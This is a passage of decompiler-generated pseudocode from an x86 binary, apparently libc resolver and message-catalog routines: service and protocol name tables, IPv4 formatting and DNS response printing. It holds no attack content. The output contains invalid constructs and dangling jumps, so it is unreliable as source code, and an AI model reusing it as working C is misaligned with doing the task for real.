    if(Vfffffbb8 != 0) {
        L0805C290(Vfffffbb8);
    }
    if(Vfffffbbc == 0) {
        goto L0805e16e;
    }
L0805e3d6:
    eax = L0805E640(Vfffffbbc, Ac, & Vfffffbc0);
    edx = eax;
L0805e3ef:
    esp = ebp + -1124;
}


L0805E3FC(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    if(A8 != -1 && A8 != 0 && Ac > 0) {
        edi = 0;
        eax = Ac - 1;
        if(*(A8 + 12) <= eax) {
            goto L0805e434;
        }
        ecx = eax;
        esi = Ac;
    } else {
L0805e42c:
        eax = 0;
        goto L0805e4c2;
L0805e434:
        ecx = ( *(A8 + 12) - edi >> 31) + ecx >> 1;
    }
    while(1) {
        ebx = ecx + ecx * 2 + (ecx + ecx * 2) * 8 + ecx;
        ebx = ebx + *(A8 + 16);
        edx = Ac;
        if(*ebx == edx) {
            goto L0805e4b0;
        }
        >= ? L0805e480 : ;
        edi = ecx + 1;
        eax = edx - *ebx + ecx + 1;
        if(esi > eax) {
            esi = eax;
        }
        ebx = 1;
L0805e487:
        if(edi >= esi) {
            goto L0805e42c;
        }
        if(esi - edi != 1) {
            eax = esi - edi;
            eax = eax + (eax >> 31) >> 1;
            ebx = ebx * eax;
            ecx = ecx + eax;
            continue;
        }
        ecx = ecx + ebx;
    }
    esi = ecx;
    ebx = -1;
    goto L0805e487;
L0805e4b0:
    if(*(ebx + 24) != 0) {
        L0805E844(A8, ebx);
    }
    eax = ebx;
L0805e4c2:
}


L0805E4CC(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    if(A8 != 0) {
        if(*(A8 + 24) != 0 || Ac <= 0) {
            goto L0805e4fc;
        }
        edi = 0;
        eax = Ac - 1;
        if(*(A8 + 20) <= eax) {
            goto L0805e500;
        }
        ecx = eax;
        esi = Ac;
    } else {
L0805e4fc:
        eax = 0;
        goto L0805e578;
L0805e500:
        ecx = ( *(A8 + 20) - edi >> 31) + ecx >> 1;
    }
    while(1) {
        eax = ecx + ecx * 2 << 2;
        eax = eax + *(A8 + 8);
        edx = Ac;
        if(*eax == edx) {
            goto L0805e578;
        }
        >= ? L0805e548 : ;
        edi = ecx + 1;
        eax = edx - *eax + ecx + 1;
        if(esi > eax) {
            esi = eax;
        }
        ebx = 1;
L0805e54f:
        if(edi >= esi) {
            goto L0805e4fc;
        }
        if(esi - edi != 1) {
            eax = esi - edi;
            eax = eax + (eax >> 31) >> 1;
            ebx = ebx * eax;
            ecx = ecx + eax;
            continue;
        }
        ecx = ecx + ebx;
    }
    esi = ecx;
    ebx = -1;
    goto L0805e54f;
L0805e578:
}



L0805E584(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{



    eax = L0805E4CC(L0805E3FC(A8, Ac), A10);
    edx = A14;
    if(eax != 0) {
        edx = *(eax + 4);
    }
    return(edx);
}




L0805E640(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffffc;



    edi = A8;
    ebx = Ac;
    esi = L0805BD74(24);
    if(esi == 0) {
        eax = -1;
    } else {
        *esi = ebx;
        eax = open(edi, O_RDONLY);
        *(esi + 4) = eax;
        if(*(esi + 4) < 0) {
            eax = 0;
        } else {
            eax = *(A10 + 20);
            *(esi + 8) = eax;
            ebx = mmap(0, *(esi + 8), PROT_READ, MAP_SHARED, *(esi + 4), 0);
            if(ebx == -1) {
                close( *(esi + 4));
                eax = 0;
            } else {
                close( *(esi + 4));
                if(*(esi + 8) > 27) {
                    *(esi + 4) = ebx;
                    if(L08057B04(ebx, "*nazgul*", 8) == 0) {
                        eax = *(esi + 4);
                        if(*(eax + 8) != 1) {
                            (save)1;
                            (save) *(eax + 8);
                            (save)edi;
                            L0804F680(0x80787a4, "%s: %s is version %d, we need %d.\n", "Message Catalog System");
                            eax = 0;
                            goto L0805e838;
                        }
                        eax = *(esi + 4);
                        if(*(eax + 20) <= 0) {
                            (save) *(eax + 20);
                            (save)edi;
                            L0804F680(0x80787a4, "%s: %s has %d sets!\n", "Message Catalog System");
                            eax = 0;
                            goto L0805e838;
                        }
                        *(esi + 12) = *( *(esi + 4) + 20);
                        eax = *( *(esi + 4) + 20);
                        eax = L0805BD74(eax + eax + eax * 2 + (eax + eax * 2) * 8);
                        *(esi + 16) = eax;
                        if(*(esi + 16) == 0) {
L0805e76f:
                            L0804F680(0x80787a4, "%s: no more memory.\n", "Message Catalog System");
                            eax = -1;
                            goto L0805e838;
                        }
                        edx = *( *(esi + 4) + 24);
                        edi = 0;
                        if(*(esi + 12) <= 0) {
                            goto L0805e824;
                        }
                        Vfffffffc = 0;
                        do {
                            if(*(esi + 8) < edx) {
                                goto L0805e7f8;
                            }
                            ebx = Vfffffffc + *(esi + 16);
                            if(*(esi + 8) < edx + 28) {
                                goto L0805e7f8;
                            }
                            L08056480(edx + *(esi + 4), ebx, 28);
                            if(*(ebx + 24) == 0) {
                                if(*esi != 1) {
                                    *(ebx + 24) = -1;
                                    goto L0805e817;
                                }
                                eax = L0805E844(esi, ebx);
                                if(eax > 0) {
                                    goto L0805e817;
                                } else {
                                    goto L0805e7ef;
                                }
                            }
                            Vfffffffc = Vfffffffc + -28;
                            edi = edi - 1;
L0805e817:
                            edx = *(ebx + 4);
                            Vfffffffc = Vfffffffc + 28;
                            edi = edi + 1;
                        } while(*(esi + 12) > edi);
                        goto L0805e824;
L0805e7ef:
                        if(eax == -1) {
                            goto L0805e76f;
                        }
                    }
                }
L0805e7f8:
                L0804F680(0x80787a4, "%s: corrupt file.\n", "Message Catalog System");
                eax = 0;
                goto L0805e838;
L0805e824:
                if(*esi == 1) {
                    munmap( *(esi + 4), *(esi + 8));
                }
                eax = esi;
            }
        }
    }
L0805e838:
    esp = ebp - 16;
}



L0805E844(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffffc;



    A8 = *(Ac + 12);
    Vfffffffc = A8;
    if(*(A8 + 8) >= Vfffffffc) {
        eax = L0805BD74( *(Ac + 16));
        *(Ac + 12) = eax;
        if(*(Ac + 12) != 0) {
            if(*(A8 + 8) < Vfffffffc + *(Ac + 16)) {
                goto L0805e8dc;
            }
            A8 = Ac;
            L08056480(Vfffffffc + *(A8 + 4), *(A8 + 12), *(A8 + 16));
            A8 = *(Ac + 8);
            Vfffffffc = A8;
            if(*(A8 + 8) < Vfffffffc) {
                goto L0805e8dc;
            }
            eax = L0805BD74( *(Ac + 20) + *(Ac + 20) * 2 << 2);
            *(Ac + 8) = eax;
            if(*(Ac + 8) != 0) {
                goto L0805e8e0;
            }
        }
        eax = -1;
    } else {
L0805e8dc:
        eax = 0;
        goto L0805e948;
L0805e8e0:
        edi = 0;
        if(*(Ac + 20) > 0) {
            esi = 0;
            do {
                ebx = esi;
                ebx = ebx + *(Ac + 8);
                if(*(A8 + 8) < Vfffffffc + 12) {
                    goto L0805e8dc;
                }
                L08056480(Vfffffffc + *(A8 + 4) + esi, ebx, 12);
                if(*(ebx + 8) == 0) {
                    *(ebx + 4) = *(ebx + 4) + *(Ac + 12);
                } else {
                    esi = esi + -12;
                    edi = edi - 1;
                }
                esi = esi + 12;
                edi = edi + 1;
            } while(*(Ac + 20) > edi);
        }
        *(Ac + 24) = 0;
        eax = 1;
    }
L0805e948:
    esp = ebp - 16;
}



L0805E954()
{



    if(*L08078F9C == 0) {
        (save)0x8069490;
        (save)5;
        L08062D4C();
        eax = L0805E110("libc", 0);
        *L08078F9C = eax;
    }
}



L0805E984(A8, A9, Aa, Ab)
/* unknown */ void  A8;
/* unknown */ void  A9;
/* unknown */ void  Aa;
/* unknown */ void  Ab;
{



    L08062888(0x807e39c, 18, "%d.%d.%d.%d", A8 & 255, A9 & 255, Aa & 255, Ab & 255);
    return(0x807e39c);
}



L0805E9B8(A8)
/* unknown */ void  A8;
{



    eax = A8 - 5;
    if(eax <= 165) {
        goto *(eax * 4 + 0x805e9d4)[L0805ec6c, L0805ee88, L0805ec78, L0805ee88, L0805ec84, L0805ee88, L0805ec90, L0805ee88, L0805ec9c, L0805ee88, L0805eca8, L0805ee88, L0805ecb4, L0805ee88, L0805ecc0, L0805eccc, L0805ecd8, L0805ee88, L0805ece4, L0805ee88, L0805ecf0, L0805ee88, L0805ee88, L0805ee88, L0805ee88, L0805ee88, L0805ee88, L0805ee88, L0805ee88, L0805ee88, L0805ee88, L0805ee88, L0805ecfc, L0805ee88...]goto ( *(eax * 4 + 0x805e9d4));
        return("rje");
        esp = ebp;
        return("echo");
        esp = ebp;
        return("discard");
        esp = ebp;
        return("systat");
        esp = ebp;
        return("daytime");
        esp = ebp;
        return("netstat");
        esp = ebp;
        return("qotd");
        esp = ebp;
        return("chargen");
        esp = ebp;
        return("ftp-data");
        esp = ebp;
        return("ftp");
        esp = ebp;
        return("telnet");
        esp = ebp;
        return("smtp");
        esp = ebp;
        return("time");
        esp = ebp;
        return("rlp");
        esp = ebp;
        return("name");
        esp = ebp;
        return("whois");
        esp = ebp;
        return("domain");
        esp = ebp;
        return("apts");
        esp = ebp;
        return("apfs");
        esp = ebp;
        return("bootps");
        esp = ebp;
        return("bootpc");
        esp = ebp;
        return("tftp");
        esp = ebp;
        return("finger");
        esp = ebp;
        return("link");
        esp = ebp;
        return("supdup");
        esp = ebp;
        return("newacct");
        esp = ebp;
        return("hostnames");
        esp = ebp;
        return("iso-tsap");
        esp = ebp;
        return("x400");
        esp = ebp;
        return("x400-snd");
        esp = ebp;
        return("csnet-ns");
        esp = ebp;
        return("pop-2");
        esp = ebp;
        return("sunrpc");
        esp = ebp;
        return("auth");
        esp = ebp;
        return("sftp");
        esp = ebp;
        return("uucp-path");
        esp = ebp;
        return("nntp");
        esp = ebp;
        return("erpc");
        esp = ebp;
        return("ntp");
        esp = ebp;
        return("statsrv");
        esp = ebp;
        return("profile");
        esp = ebp;
        return("NeWS");
        esp = ebp;
        return("snmp");
        esp = ebp;
        return("snmp-trap");
        esp = ebp;
        return("print-srv");
    }
    L0804F808(0x807e3b0, "%d", A8);
    return(0x807e3b0);
}



L0805EEA4(A8)
/* unknown */ void  A8;
{



    eax = A8 - 1;
    if(eax <= 16) {
        goto *(eax * 4 + 0x805eec0)[L0805ef04, L0805ef10, L0805ef1c, L0805ef94, L0805ef28, L0805ef34, L0805ef40, L0805ef4c, L0805ef58, L0805ef94, L0805ef64, L0805ef70, L0805ef94, L0805ef94, L0805ef94, L0805ef7c, L0805ef88, ]goto ( *(eax * 4 + 0x805eec0));
        return("icmp");
        esp = ebp;
        return("igmp");
        esp = ebp;
        return("ggp");
        esp = ebp;
        return("st");
        esp = ebp;
        return("tcp");
        esp = ebp;
        return("ucl");
        esp = ebp;
        return("egp");
        esp = ebp;
        return("igp");
        esp = ebp;
        return("nvp-II");
        esp = ebp;
        return("pup");
        esp = ebp;
        return("chaos");
        esp = ebp;
        return("udp");
    }
    L0804F808(0x807e3c4, "%d", A8);
    return(0x807e3c4);
}



L0805EFB0(A8, Ac, A10, A14, A18, A1c, A20)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A20;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    ebx = A10;
    edi = A18 & *L080786A4;
    asm("xchg al,ah");
    esi = A14 & 65535;
    if(esi != 0) {
        if(*L080786A4 == 0 || edi != 0 && !( *L080786A5 & 1)) {
            L0804F680(A1c, A20);
        }
        if(!(esi = esi - 1)) {
            eax = !esi & 1;
            if(esi <= -1 || eax != 0) {
                if(*L080786A4 == 0 || edi != 0) {
                    (save)A1c;
                    (save)A8;
                    (save)ebx;
                    ebx = L0805F7E4();
                } else {
                    ebx = L0804D404(ebx, ebx + 255) + ebx + 8;
                    ebx = (L0804D6B8(ebx) & 65535) + ebx + 2;
                }
                if(Ac < ebx - A8) {
                    goto L0805f13c;
                }
                if(esi = esi - 1) {
                    goto L0805f110;
                }
            }
            do {
                if(*L080786A4 != 0) {
                    if(edi != 0) {
                        goto L0805f075;
                    }
                    ebx = L0804D404(ebx, ebx + 255) + ebx + 8;
                    ebx = (L0804D6B8(ebx) & 65535) + ebx + 2;
                } else {
L0805f075:
                    (save)A1c;
                    (save)A8;
                    (save)ebx;
                    ebx = L0805F7E4();
                }
                if(Ac < ebx - A8) {
                    goto L0805f13c;
                }
                esi = esi - 1;
                if(*L080786A4 != 0) {
                    if(edi != 0) {
                        goto L0805f0c7;
                    }
                    ebx = L0804D404(ebx, ebx + 255) + ebx + 8;
                    ebx = (L0804D6B8(ebx) & 65535) + ebx + 2;
                } else {
L0805f0c7:
                    (save)A1c;
                    (save)A8;
                    (save)ebx;
                    ebx = L0805F7E4();
                }
                if(Ac < ebx - A8) {
                    goto L0805f13c;
                }
            } while(esi = esi - 1);
        }
L0805f110:
        if(*L080786A4 == 0) {
            goto L0805f126;
        }
        if(edi != 0 && !( *L080786A5 & 1)) {
L0805f126:
            ecx = A1c;
            if(*(ecx + 24) <= *(ecx + 20)) {
                L08061910(ecx, 10);
                goto L0805f14c;
L0805f13c:
                eax = 0;
                goto L0805f14e;
            }
            ecx = A1c;
            *( *(ecx + 20)) = 10;
            *(ecx + 20) = *(ecx + 20) + 1;
        }
    }
L0805f14c:
    eax = ebx;
L0805f14e:
}





L0805F1DC(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffef8;
	/* unknown */ void  Vfffffefc;
	/* unknown */ void  Vffffff00;



    if(!( *L0807854C & 1)) {
        eax = L0804D744();
        if(eax == -1) {
            goto L0805f663;
        }
    }
    edx = A8;
    Vfffffef8 = edx;
    ebx = Vfffffef8 + 12;
    Vfffffefc = Ac + ebx;
    if(*L080786A4 == 0 || *L080786A5 & 8 || !( *(A8 + 3) & 15)) {
        edx = Vfffffef8;
        ax = *edx;
        asm("xchg al,ah");
        eax = eax & 65535;
        (save)eax;
        eax = *(( *(edx + 3) & 15) * 4 + 0x8078fec);
        (save)eax;
        L0804F680(A10, ";; ->>HEADER<<- opcode: %s, status: %s, id: %d", *(( *(edx + 2) >> 3 & 15) * 4 + 0x8078fac));
        if(*(A10 + 24) <= *(A10 + 20)) {
            eax = L08061910(A10, 10);
        } else {
            eax = *(A10 + 20);
            *eax = 10;
            *(A10 + 20) = *(A10 + 20) + 1;
        }
    }
    if(*L080786A4 == 0 || !( *L080786A5 & 8)) {
        if(*(A10 + 24) <= *(A10 + 20)) {
            eax = L08061910(A10, 59);
        } else {
            eax = *(A10 + 20);
            *eax = 59;
            *(A10 + 20) = *(A10 + 20) + 1;
        }
    }
    if(*L080786A4 == 0 || !( *L080786A5 & 2)) {
        eax = L0804F680(A10, "; flags:");
        if(*(Vfffffef8 + 2) < 0) {
            eax = L0804F680(A10, " qr");
        }
        if(!( *(Vfffffef8 + 2) & 4)) {
            eax = L0804F680(A10, " aa");
        }
        if(!( *(Vfffffef8 + 2) & 2)) {
            eax = L0804F680(A10, " tc");
        }
        if(!( *(Vfffffef8 + 2) & 1)) {
            eax = L0804F680(A10, " rd");
        }
        if(*(Vfffffef8 + 3) < 0) {
            eax = L0804F680(A10, " ra");
        }
    }
    if(*L080786A4 == 0 || !( *L080786A5 & 1)) {
        ax = *(Vfffffef8 + 4);
        asm("xchg al,ah");
        eax = L0804F680(A10, "; Ques: %d", eax & 65535);
        ax = *(Vfffffef8 + 6);
        asm("xchg al,ah");
        eax = L0804F680(A10, ", Ans: %d", eax & 65535);
        ax = *(Vfffffef8 + 8);
        asm("xchg al,ah");
        eax = L0804F680(A10, ", Auth: %d", eax & 65535);
        ax = *(Vfffffef8 + 10);
        asm("xchg al,ah");
        L0804F680(A10, ", Addit: %d", eax & 65535);
    }
    if(*L080786A4 == 0 || !( *L080786A5 & 11)) {
        if(*(A10 + 24) <= *(A10 + 20)) {
            L08061910(A10, 10);
        } else {
            *( *(A10 + 20)) = 10;
            *(A10 + 20) = *(A10 + 20) + 1;
        }
    }
    ax = *(Vfffffef8 + 4);
    asm("xchg al,ah");
    edi = ax & 65535;
    if(edi != 0) {
        if(*L080786A4 == 0 || !( *L080786A4 & 16)) {
            L0804F680(A10, ";; QUESTIONS:\n");
        }
        if(!(edi = edi - 1)) {
            do {
                if(*L080786A4 == 0 || !( *L080786A4 & 16)) {
                    L0804F680(A10, ";;\t");
                }
                if(Vfffffefc <= ebx) {
                    goto L0805f650;
                }
                if(*L080786A4 != 0) {
                    if(!( *L080786A4 & 16)) {
                        goto L0805f4ae;
                    }
                    eax = L0804D02C(A8, A8 + Ac, ebx, & Vffffff00, 256);
                    if(eax < 0) {
                        goto L0805f658;
                    }
                    ebx = ebx + eax;
                } else {
L0805f4ae:
                    ebx = L0805F68C(ebx, A8, Ac, A10);
                }
                if(ebx == 0) {
                    goto L0805f658;
                }
                if(Vfffffefc <= ebx) {
                    goto L0805f650;
                }
                if(*L080786A4 == 0 || !( *L080786A4 & 16)) {
                    (save)L0804D6B8(ebx) & 65535;
                    L0804F680(A10, ", type = %s", L08060004());
                }
                ebx = ebx + 2;
                if(Vfffffefc <= ebx) {
                    goto L0805f650;
                }
                if(*L080786A4 == 0 || !( *L080786A4 & 16)) {
                    (save)L0804D6B8(ebx) & 65535;
                    L0804F680(A10, ", class = %s\n", L080605D0());
                }
                ebx = ebx + 2;
                if(*L080786A4 == 0 || !( *L080786A4 & 16)) {
                    if(*(A10 + 24) > *(A10 + 20)) {
                        *( *(A10 + 20)) = 10;
                        *(A10 + 20) = *(A10 + 20) + 1;
                    } else {
                        L08061910(A10, 10);
                    }
                }
            } while(edi = edi - 1);
        }
    }
    if(Vfffffefc > ebx) {
        ebx = L0805EFB0(A8, Ac, ebx, *(Vfffffef8 + 6) & 65535, 32, A10, ";; ANSWERS:\n");
        if(ebx == 0) {
            goto L0805f658;
        }
        if(Vfffffefc > ebx) {
            ebx = L0805EFB0(A8, Ac, ebx, *(Vfffffef8 + 8) & 65535, 64, A10, ";; AUTHORITY RECORDS:\n");
            if(ebx == 0) {
                goto L0805f658;
            }
            if(Vfffffefc > ebx) {
                eax = L0805EFB0(A8, Ac, ebx, *(Vfffffef8 + 10) & 65535, 128, A10, ";; ADDITIONAL RECORDS:\n");
                if(eax == 0) {
                    goto L0805f658;
                }
                goto L0805f663;
            }
        }
    }
L0805f650:
    (save)"\n;; ...truncated\n";
    goto L0805f65d;
L0805f658:
    (save)"\n;; ...malformed\n";
L0805f65d:
    eax = L0804F680(A10);
L0805f663:
    esp = ebp + -276;
}




L0805F68C(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  esi;
	/* unknown */ void  Vffffff00;



    eax = Ac;
    esi = L0804D02C(eax, eax + A10, A8, & Vffffff00, 256);
    if(esi < 0) {
        eax = 0;
    } else {
        if(Vffffff00 == 0) {
            if(*(A14 + 24) <= *(A14 + 20)) {
                (save)46;
                (save)A14;
                L08061910();
            } else {
                *( *(A14 + 20)) = 46;
                *(A14 + 20) = *(A14 + 20) + 1;
            }
        } else {
            L080624D0( & Vffffff00, A14);
        }
        eax = esi + A8;
    }
    esp = ebp + -268;
}




L0805F730(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffefc;
	/* unknown */ void  Vffffff00;



    eax = L0804D02C(Ac, A8 + 255, A8, & Vffffff00, 256);
    Vfffffefc = eax;
    if(Vfffffefc < 0) {
        eax = 0;
    } else {
        if(Vffffff00 == 0) {
            if(*(A10 + 24) <= *(A10 + 20)) {
                goto L0805f7ba;
            }
            goto L0805f7c4;
        }
        ebx = & Vffffff00;
        L080624D0(ebx, A10);
        al = 0;
        edi = ebx;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        if(*(ebp + !ecx + -258) != 46) {
            if(*(A10 + 24) <= *(A10 + 20)) {
L0805f7ba:
                L08061910(A10, 46);
            } else {
L0805f7c4:
                *( *(A10 + 20)) = 46;
                *(A10 + 20) = *(A10 + 20) + 1;
            }
        }
        eax = A8 + Vfffffefc;
    }
    esp = ebp + -272;
}



L0805F7E4(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    esi = A8;
    if(!( *L0807854C & 1)) {
        eax = L0804D744();
        if(eax == -1) {
            *L0807E788 = -1;
L0805f810:
            eax = 0;
            goto L0805fff7;
        }
    }
    eax = L0805F730(esi, Ac, A10);
    esi = eax;
    if(esi == 0) {
        goto L0805f810;
    }
    Vfffffff8 = L0804D6B8(esi) & 65535;
    esi = esi + 2;
    ebx = L0804D6B8(esi) & 65535;
    esi = esi + 2;
    eax = L0804D6D4(esi);
    Vffffffe4 = eax;
    esi = esi + 4;
    Vfffffff4 = L0804D6B8(esi) & 65535;
    esi = esi + 2;
    Vffffffec = esi;
    if(*L080786A4 == 0 || !( *L080786A5 & 4)) {
        eax = L0804F680(A10, "\t%lu", Vffffffe4);
    }
    if(*L080786A4 == 0 || !( *L080786A4 & 4)) {
        (save)ebx;
        L080605D0();
        eax = L0804F680(A10, "\t%s", eax);
    }
    (save)Vfffffff8;
    L08060004();
    eax = L0804F680(A10, "\t%s", eax);
    eax = Vfffffff8 - 1;
    if(eax <= 101) {
        goto *(eax * 4 + 0x805f8e4)[L0805fa7c, L0805fb00, L0805ffa4, L0805ffa4, L0805fb00, L0805fb84, L0805fb00, L0805fb00, L0805fb00, L0805ffa4, L0805fec0, L0805fb00, L0805fb1c, L0805fdec, L0805fca0, L0805fd14, L0805fdec, L0805fca0, L0805fd14, L0805fb1c, L0805fca0, L0805fdc8, L0805ffa4, L0805ffa4, L0805ffa4, L0805fcd0, L0805ffa4, L0805ffa4, L0805ffa4, L0805ffa4, L0805ffa4, L0805ffa4, L0805ffa4, L0805ffa4...]goto ( *(eax * 4 + 0x805f8e4));
        if(ebx == 1) {
            goto L0805fa86;
        }
        if(ebx != 4) {
            goto L0805faf8;
        }
        eax = L08056480(esi, & Vfffffffc, 4);
        if(Vfffffff4 == 4) {
            eax = Vfffffffc;
            (save)eax;
            eax = L0805E984();
            (save)eax;
            (save)"\t%s";
        } else {
            if(Vfffffff4 != 7) {
                goto L0805ffb9;
            }
            eax = Vfffffffc;
            (save)eax;
            eax = L0805E984();
            Vffffffdc = eax;
            esi = esi + 4;
            bl = *esi;
            esi = esi + 1;
            eax = L0804D6B8(esi);
            esi = esi + 2;
            eax = eax & 65535;
            (save)eax;
            (save)bl & 255;
            L0804F680(A10, "\t%s\t; proto %d, port %d", Vffffffdc);
            goto L0805ffb9;
            esi = esi + Vfffffff4;
            goto L0805ffb9;
            if(*(A10 + 24) <= *(A10 + 20)) {
                (save)9;
            } else {
                *( *(A10 + 20)) = 9;
                goto L0805fe42;
                Vffffffe8 = Vfffffff4 + esi;
                ebx = *esi & 255;
                esi = esi + 1;
                if(ebx != 0) {
                    (save)esi;
                    L0804F680(A10, "\t%.*s", ebx);
                    esi = esi + ebx;
                }
                if(Vffffffe8 > esi) {
                    ebx = *esi & 255;
                    esi = esi + 1;
                    if(ebx != 0) {
                        (save)esi;
                        L0804F680(A10, "\t%.*s", ebx);
                        esi = esi + ebx;
                        goto L0805ffb9;
                    }
                }
                if(Vfffffff8 != 13) {
                    goto L0805ffb9;
                }
                L0804F680(A10, "\n;; *** Warning *** OS-type missing");
                goto L0805ffb9;
                if(*(A10 + 24) <= *(A10 + 20)) {
                    L08061910(A10, 9);
                } else {
                    *( *(A10 + 20)) = 9;
                    *(A10 + 20) = *(A10 + 20) + 1;
                }
                esi = L0805F730(esi, Ac, A10);
                if(esi == 0) {
                    goto L0805f810;
                }
                if(*(A10 + 24) <= *(A10 + 20)) {
                    L08061910(A10, 32);
                } else {
                    *( *(A10 + 20)) = 32;
                    *(A10 + 20) = *(A10 + 20) + 1;
                }
                esi = L0805F730(esi, Ac, A10);
                if(esi == 0) {
                    goto L0805f810;
                }
                (save)A10;
                (save)" (\n";
                L080624D0();
                ebx = L0804D6D4(esi);
                esi = esi + 4;
                L0804F680(A10, "\t\t\t%lu\t; serial\n", ebx);
                ebx = L0804D6D4(esi);
                esi = esi + 4;
                (save)ebx;
                (save)L0806077C();
                L0804F680(A10, "\t\t\t%lu\t; refresh (%s)\n", ebx);
                ebx = L0804D6D4(esi);
                esi = esi + 4;
                (save)ebx;
                (save)L0806077C();
                L0804F680(A10, "\t\t\t%lu\t; retry (%s)\n", ebx);
                ebx = L0804D6D4(esi);
                esi = esi + 4;
                (save)ebx;
                (save)L0806077C();
                L0804F680(A10, "\t\t\t%lu\t; expire (%s)\n", ebx);
                ebx = L0804D6D4(esi);
                esi = esi + 4;
                (save)ebx;
                (save)L0806077C();
                L0804F680(A10, "\t\t\t%lu )\t; minimum (%s)", ebx);
                goto L0805ffb9;
                L0804F680(A10, "\t%d ", L0804D6B8(esi) & 65535);
                esi = esi + 2;
                esi = L0805F730(esi, Ac, A10);
                goto L0805fe55;
                L0804F680(A10, "\t%d ", L0804D6B8(esi) & 65535);
                esi = esi + 2;
                esi = L0805F730(esi, Ac, A10);
                if(esi == 0) {
                    goto L0805f810;
                }
                if(*(A10 + 24) > *(A10 + 20)) {
                    goto L0805fe3c;
                    L080624D0("\t\"", A10);
                    ecx = Vffffffec + Vfffffff4;
                    Vffffffe8 = ecx;
                    if(esi < Vffffffe8) {
L0805fd30:
                        ebx = *esi & 255;
                        esi = esi + 1;
                        if(ebx == 0) {
                            goto L0805fda4;
                        }
                        Vfffffff0 = ebx;
                        <= ? L0805fda4 : ;
L0805fd40:
                        if(Vffffffe8 > esi) {
                            if(*esi != 10 && *esi != 34) {
                                goto L0805fd78;
                            }
                            if(*(A10 + 24) <= *(A10 + 20)) {
                                L08061910(A10, 92);
                            } else {
                                *( *(A10 + 20)) = 92;
                                *(A10 + 20) = *(A10 + 20) + 1;
                            }
                            if(*(A10 + 24) > *(A10 + 20)) {
                                goto L0805fd90;
L0805fd78:
                                if(*(A10 + 24) > *(A10 + 20)) {
                                    goto L0805fd90;
                                }
                            }
                            esi = esi + 1;
                            L08061910(A10, *esi & 255);
                            goto L0805fd9b;
L0805fd90:
                            edx = *(A10 + 20);
                            *edx = *esi;
                            esi = esi + 1;
                            *(A10 + 20) = *(A10 + 20) + 1;
L0805fd9b:
                            Vfffffff0 = Vfffffff0 - 1;
                            if(Vfffffff0 > 0) {
                                goto L0805fd40;
                            }
L0805fda4:
                            if(Vffffffe8 > esi) {
                                goto L0805fd30;
                            }
                        }
                    }
                    if(*(A10 + 24) <= *(A10 + 20)) {
                        (save)34;
                        goto L0805ff8a;
                    }
                    *( *(A10 + 20)) = 34;
                    *(A10 + 20) = *(A10 + 20) + 1;
                    goto L0805ffb9;
                    (save)0;
                    (save)esi;
                    (save)Vfffffff4;
                    L0804F680(A10, "\t%s", L08060BD8());
                    esi = esi + Vfffffff4;
                    goto L0805ffb9;
                    if(*(A10 + 24) <= *(A10 + 20)) {
                        L08061910(A10, 9);
                    } else {
                        *( *(A10 + 20)) = 9;
                        *(A10 + 20) = *(A10 + 20) + 1;
                    }
                    esi = L0805F730(esi, Ac, A10);
                    if(esi == 0) {
                        goto L0805f810;
                    }
                    if(*(A10 + 24) > *(A10 + 20)) {
                        goto L0805fe3c;
                    }
                }
                (save)32;
            }
            (save)A10;
            L08061910();
            esp = esp + 8;
            goto L0805fe45;
L0805fe3c:
            *( *(A10 + 20)) = 32;
L0805fe42:
            *(A10 + 20) = *(A10 + 20) + 1;
L0805fe45:
            esi = L0805F730(esi, Ac, A10);
L0805fe55:
            if(esi != 0) {
                goto L0805ffb9;
            }
            goto L0805f810;
            if(*(A10 + 24) <= *(A10 + 20)) {
                L08061910(A10, 9);
            } else {
                *( *(A10 + 20)) = 9;
                *(A10 + 20) = *(A10 + 20) + 1;
            }
            L080624D0(esi, A10);
            esi = esi + Vfffffff4;
            goto L0805ffb9;
            if(Vfffffff4 != 4) {
                goto L0805ffb9;
            }
            (save)L0804D6D4(esi);
            (save)"\t%u";
        }
        (save)A10;
        L0804F680();
        esi = esi + 4;
        esp = esp + 16;
        goto L0805ffb9;
        if(Vfffffff4 > 4) {
            L08056480(esi, & Vfffffffc, 4);
            esi = esi + 4;
            (save)L0805EEA4( *esi & 255);
            L0804F680(A10, "\t%s %s ( ", L0805E984(Vfffffffc));
            esi = esi + 1;
            ebx = 0;
            Vffffffe0 = 0;
            goto L0805ff76;
L0805ff0c:
            Vfffffff0 = *esi & 255;
            esi = esi + 1;
L0805ff14:
            if(Vfffffff0 < 0) {
                if(Vffffffe0 == 0) {
                    L080624D0("\n\t\t\t", A10);
